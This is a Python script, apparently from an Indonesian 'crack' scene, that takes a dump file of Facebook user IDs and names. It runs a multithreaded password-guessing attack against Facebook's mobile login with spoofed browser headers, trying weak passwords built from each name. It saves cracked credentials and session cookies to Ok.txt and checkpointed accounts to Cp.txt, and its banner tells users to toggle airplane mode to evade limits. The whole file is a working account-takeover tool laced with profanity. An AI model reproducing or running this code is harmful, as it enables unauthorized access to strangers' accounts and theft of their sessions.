# Recode Aja asal jan dijual
P,H,K = '\x1b[1;97m','\x1b[1;92m','\x1b[1;93m'
import os
for ngimport in range(4):
	try:
		import rich
		import requests
		import fake_useragent
	except ImportError as eror:
		print ('#> Instaling {}...'.format(eror.name))
		os.system('pip install {} &> /dev/null'.format(eror.name))
import time, random, time, requests, re, sys
from concurrent.futures import ThreadPoolExecutor as mila_chan
from time import sleep
from rich.console import Console
from rich.markdown import Markdown
from fake_useragent import UserAgent
class Main:
	def __init__(self):
		self.warna = random.choice(['green','yellow'])
		self.ketik = '[deep_pink3] ╚═══► '
		self.id_crack = []
		self.ok = 0
		self.cp = 0
		self.loop = 0
		self.menu()
	def menu(self):
		os.system('clear')
		self.teks = '''## PERICODE KONTOL
```python

 ╔═╗╦╦  ╔═╗  ╔═╗╦═╗╔═╗╔═╗╦╔═╦╔╗╔╔═╗  ║ Coded by xenz
 ╠╣ ║║  ║╣   ║  ╠╦╝╠═╣║  ╠╩╗║║║║║ ╦  ║ Github: github.com/Xenz404
 ╚  ╩╩═╝╚═╝  ╚═╝╩╚═╩ ╩╚═╝╩ ╩╩╝╚╝╚═╝  ║ </> _From Maling To Money_ </>
 ║# ini sc free ya anjing ga usah dijual kontol
 ║# kalo mo jual sc minimal bikin sendiri mek
 ║# jangan sc orang lu ubah banner trus di jual
 ║
 ║  'Masukin file dumpnya mek'
 ║  Contoh: '/sdcard/dump.txt'
```'''
		Console().print(Markdown(self.teks),style='blue')
		self.filename = Console().input(self.ketik)
		if self.filename == '':Console().print(Markdown('###### Jangan kosong lah asu tinggal masukin file doang gak bisa'));exit()
		self.open_file(self.filename)
	def open_file(self, filename):
		try:
			self.buka = open(filename,'r').read().splitlines()
		except FileNotFoundError:Console().print(Markdown('###### File tidak ditemukan'));exit()
		for self.id_dump in self.buka:
			try:
				self.cek_pemisah = self.id_dump.split('|')
				self.id_crack.append(self.id_dump)
			except AttributeError:Console().print(Markdown('###### Pemisah tidak didukung untuk sc ini perintah yg didukung \ '));exit()
		self.notice = '''## Hidupkan/Matikan modepesawat setiap 5 menit
- Result Ok Saved in: Ok.txt
- Result Cp Saved in: Cp.txt'''
		Console().print(Markdown(self.notice))
		print ()
		with mila_chan(max_workers=20) as mila:
			for self.akun in self.id_crack:
				self.idf = self.akun.split('|')[0]
				self.full_name = self.akun.split('|')[1]
				self.depan = self.full_name.split(' ')[0]
				# Nih list pw klo mo ganti
				self.list_pw = [self.full_name,self.depan+'123',self.depan+'12345',self.depan+'123456','123456']
				mila.submit(self.crack, self.idf, self.list_pw)
		print ('\r{P} Crack selesai                ')
		exit()
	def crack(self, idf, list_pw):
		sys.stdout.write(f'{random.choice[K,H,P]}      \r {self.loop} to {len(self.id_crack)} LIVE:{self.ok} SESI:{self.cp} ')
		sys.stdout.flush()
		#Nih ua klo mo ganti
		ua = UserAgent().chrome
		for pw in list_pw:
			pw = pw.lower()
			try:
				session = requests.Session()
				HEAD1 = {
				'Host': 'm.facebook.com',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': "Android",
				'save-data': 'on',
				'upgrade-insecure-requests': '1',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'referer': 'https://m.facebook.com/login/?refsrc=deprecated',
				'accept-encoding': 'gzip, deflate',
				'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
				}
				link = session.get('https://m.facebook.com/login/?refsrc=deprecated',headers=HEAD1)
				data = {
				'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
				'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
				'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
				'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
				'email': idf,
				'prefill_contact_point': idf,
				'prefill_source': 'browser_dropdown',
				'prefill_type': 'contact_point',
				'first_prefill_source': 'browser_dropdown',
				'first_prefill_type': 'contact_point','had_cp_prefilled': True,
				'had_password_prefilled': False,
				'is_smart_lock': False,
				'bi_xrwh': 0,
				'encpass': '#PWD_BROWSER:0:{}:{}'.format(int(time.time()),pw),
				'fb_dtsg': re.search('{"dtsg":{"token":"(.*?)"', str(link.text)).group(1),
				'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
				'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
				'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
				'__csr': '',
				'__req': random.randint(1,9),
				'__a': re.search('"encrypted":"(.*?)"', str(link.text)).group(1),
				'__user':0
				}
				HEAD2 = {
				'Host': 'm.facebook.com',
				'content-length': str(len((";").join([ "%s=%s" % (key, value) for key, value in data.items()]))),
				'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
				'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
				'content-type': 'application/x-www-form-urlencoded',
				'sec-ch-ua-mobile': '?1',
				'save-data': 'on',
				'user-agent': ua,
				'sec-ch-ua-platform': "Android",
				'accept': '*/*','origin': 'https://m.facebook.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://m.facebook.com/login/?refsrc=deprecated',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
				}
				ress = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=HEAD2,allow_redirects=False)
				if "c_user" in session.cookies.get_dict().keys():
					self.ok+=1
					self.coki = (";").join([ "%s=%s" % (key, value) for key, value in ress.cookies.get_dict().items()])
					open('Ok.txt','a').write(idf+'|'+pw+'|'+self.cookie+'\n')
					print(f'\r {P}[{H}LIVE{P}] {idf}|{pw}\n {P}->{H} {self.coki}')
					break
				if "checkpoint" in session.cookies.get_dict().keys():
					self.cp+=1
					open('Cp.txt','a').write(idf+'|'+pw+'\n')
					print(f'\r {P}[{K}SESI{P}] {idf}|{pw}                    ')
					break
				else:continue
			except requests.exceptions.ConnectionError:
				sleep(10)
		self.loop+=1

if __name__=='__main__':
	Main()

# YOUR FACE IS A DICK
